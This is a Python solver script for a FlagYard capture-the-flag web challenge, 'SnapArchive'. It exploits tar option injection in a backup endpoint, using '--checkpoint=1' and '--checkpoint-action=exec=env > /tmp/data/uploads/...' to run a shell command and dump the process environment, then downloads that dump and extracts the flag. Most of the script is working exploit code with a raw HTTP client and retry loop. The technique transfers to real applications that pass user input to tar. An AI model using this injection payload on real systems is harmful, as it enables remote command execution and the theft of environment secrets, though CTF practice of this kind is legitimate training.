#!/usr/bin/env python3
"""
SnapArchive  -  FlagYard Web challenge solver (tar option-injection RCE)

SnapArchive is a small document-backup service.  You upload files, pick a few,
and it serves you a `tar.gz` backup.  Under the hood every HTTP client is a
BRAND-NEW redpwn/jail instance (per-connection tmpfs at /tmp), and creating a
backup shells out to GNU tar with the *user-selected* filename list spliced
straight into the command:

    $`tar -czf ${archivePath} -C ${UPLOAD_DIR} ${files}`.quiet()

The `files` array is checked only for type/length (max 20 x 300 chars) and is
otherwise TRUSTED.  GNU tar accepts options mixed with operands, so a request
like this:

    files = ["--ignore-failed-read", "/", ...]

makes tar walk ANY filesystem path the app user can read.  That already gives
a full file-read + directory-listing primitive.  The real kicker: `-c` (create)
supports command-invoking checkpoint actions:

    files = ["--checkpoint=1",
             "--checkpoint-action=exec=env > /tmp/data/uploads/leak.txt", ...]

`--checkpoint-action=exec=CMD` runs CMD via /bin/sh while the archive is being
created.  (For reference, `--to-command` is a dead end here - it is only
honored during EXTRACTION, not creation.)  The service runs as the `bun` user
inside jail, so we run as the app user, and in this challenge the flag lives in
the process ENVIRONMENT as DYN_FLAG=FlagY{...}, not in a readable file.

This solver does it all in ONE raw keep-alive TCP session (state persists
inside a single jail instance - uploads/backups created earlier in the
connection stay visible for later requests in the same connection):

    1. POST /api/backup  with checkpoint RCE writing `env` into uploads/
    2. GET  /api/files/leak.txt   -> parse DYN_FLAG
    3. save flag_ from <dir>/flag_from_snaparch.txt  + verify FlagY{...} format
"""
from __future__ import annotations

import json
import re
import socket
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt() -> None:
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            k32.SetConsoleMode(k32.GetStdHandle(-11), 0x0007)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except Exception:
            pass

enable_vt()
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

def progress(msg: str) -> None:
    print(C.DIM + "[*] " + msg + C.RESET)

def ok(msg: str) -> None:
    print(C.GREEN + "[+] " + msg + C.RESET)

def warn(msg: str) -> None:
    print(C.YELLOW + "[!] " + msg + C.RESET)

def banner() -> None:
    print(C.MAGENTA + C.BOLD)
    W = 58
    titles = ("S N A P A R C H I V E   S O L V E R",
              "tar --checkpoint-action exec RCE | env leak | NOSJ jail")
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    for t in titles:
        t = t if len(t) <= W else t[: W - 1] + "\u2026"
        l = (W - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (W - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * W + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# tiny raw-HTTP/1.1 keep-alive client (no external deps)
# ---------------------------------------------------------------------------
class Http:
    def __init__(self, host: str, port: int = 80, timeout: float = 40.0):
        self.host, self.timeout = host, timeout
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.idx = 0

    def send(self, method: str, path: str, body: dict | None = None,
             close: bool = True) -> None:
        req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
        req += "Connection: %s\r\n" % ("close" if close else "keep-alive")
        if body is not None:
            jb = json.dumps(body)
            req += ("Content-Type: application/json\r\n"
                    "Content-Length: %d\r\n\r\n%s" % (len(jb.encode()), jb))
        else:
            req += "\r\n"
        self.sock.sendall(req.encode("latin1"))

    def parse(self) -> list[tuple[int, dict, bytes]]:
        buf = b""
        try:
            while True:
                chunk = self.sock.recv(262144)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        out: list[tuple[int, dict, bytes]] = []
        while buf:
            end = buf.find(b"\r\n\r\n")
            if end == -1:
                break
            head = buf[:end].decode("latin1")
            status = int(head.split("\r\n")[0].split(" ")[1])
            headers = {}
            for ln in head.split("\r\n")[1:]:
                if ":" in ln:
                    k, v = ln.split(":", 1)
                    headers[k.strip().lower()] = v.strip()
            clen = int(headers.get("content-length", 0))
            body = buf[end + 4: end + 4 + clen]
            out.append((status, headers, body))
            buf = buf[end + 4 + clen:]
        return out

# ---------------------------------------------------------------------------
# exploit hook (self-contained, reusable)
# ---------------------------------------------------------------------------
FLAG_RE = re.compile(r"^FlagY\{[0-9a-zA-Z_]{16,64}\}$")

def exploit(host: str, attempts: int = 5) -> str:
    import time as _time
    last = None
    for attempt in range(1, attempts + 1):
        try:
            progress("attempt %d/%d - opening one keep-alive jail session (state persists per conn)..." % (attempt, attempts))
            http = Http(host)

            leak = "zz_dynflag.txt"
            payload = [
                "--checkpoint=1",
                f"--checkpoint-action=exec=env > /tmp/data/uploads/{leak}",
                "readme.txt",
            ]
            http.send("POST", "/api/backup",
                      {"archiveName": "leak", "files": payload}, close=False)
            http.send("GET", f"/api/files/{leak}", None, close=True)

            responses = http.parse()
            if not responses:
                raise RuntimeError("no HTTP responses received (instance was recycled / timeout)")
            st_backup, _, body_backup = responses[0]
            if st_backup != 200:
                raise RuntimeError(
                    "backup RCE failed (status %d): %s" % (
                        st_backup, body_backup.decode("utf-8", "replace")))
            progress("backup + checkpoint RCE accepted")

            st_leak, _, body_leak = responses[1]
            if st_leak != 200:
                raise RuntimeError("leak file not served back (status %d)" % st_leak)
            text = body_leak.decode("utf-8", "replace")
            progress("env dump captured (%d bytes)" % len(text))

            m = re.search(r"(?m)^DYN_FLAG=(\S+)$", text)
            if not m:
                raise RuntimeError("DYN_FLAG not found in: %r" % text[:400])
            flag = m.group(1)
            if not FLAG_RE.match(flag):
                raise RuntimeError("flag failed format check: %r" % flag)
            return flag
        except Exception as e:  # noqa: BLE001
            last = e
            warn("attempt %d failed: %s" % (attempt, e))
            if attempt < attempts:
                _time.sleep(20)
    raise RuntimeError("all attempts failed; last error: %s" % last)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits  (standard FlagYard design)
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

def save_flag(dir_path: Path, flag: str) -> None:
    out = dir_path / "flag_from_snaparch.txt"
    out.write_text(flag.rstrip("\n") + "\n", encoding="utf-8")
    ok("saved %s" % out)

def main() -> int:
    import time as _time
    banner()
    DEFAULT_URL = "http://k725e76b27717474b73976e5483536571.playat.flagyard.com"
    base = sys.argv[1] if len(sys.argv) > 1 else input("  Challenge URL > ").strip()
    if not base:
        base = DEFAULT_URL
    print("  " + C.GRAY + "target : " + C.CYAN + base + C.RESET)
    print()
    host = base.partition("://")[2].rstrip("/")
    here = Path(__file__).resolve().parent
    t0 = _time.time()
    try:
        flag = exploit(host)
    except Exception as e:
        warn("exploit failed: %s" % e)
        warn("the per-connection jail can recycle instances; simply re-run")
        return 1
    save_flag(here, flag)
    big_flag("FlagY{" + flag.partition("{")[2].rstrip("}") + "}" if flag.startswith("FlagY{") else flag,
             _time.time() - t0,
             "keep-alive jail session | DYN_FLAG env leak")
    return 0

if __name__ == "__main__":
    sys.exit(main())